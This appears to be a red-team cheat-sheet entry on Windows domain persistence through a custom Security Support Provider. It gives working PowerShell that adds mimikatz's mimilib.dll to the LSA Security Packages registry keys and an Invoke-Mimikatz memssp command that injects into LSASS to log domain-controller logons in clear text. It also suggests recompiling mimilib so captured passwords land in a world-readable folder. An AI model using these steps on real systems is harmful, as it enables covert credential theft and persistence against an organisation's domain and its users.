# Custom SSP

Security Support Provider is a DLL which provides ways for an application to obtain an authenticated connection. - Noisy\
\
Microsoft SSPs:

* NTLM
* Kerberos
* Wdigest
* CredSSP

## Exploitation

Mimikatz can provide a custom SSP (mimilib.dll) which logs local logons, service account, and machine account passwords in clear text on the target server.

Drop the mimilib.dll to system32 and add mimilib to Security Packages:

```powershell
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages'
$packages += "mimilib"

Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
```

Using mimikatz, inject into LSASS (not stable but usable)

```powershell
Invoke-Mimikatz -Command '"misc::memssp"'
```

{% hint style="info" %}
All local logons on the DC are logged to C:\Windows\system32\mimilsa.log or C:\Windows\system32\kiwissp.log



To read above logs we need admin access on the DC or Domain Admin role which kinda defeats the purpose of persistence. So the other way is we can develop or re-compile the mimilib to store the log on any other world readable directory, using which the attacker/we can get the clear text passwords for the logons.
{% endhint %}
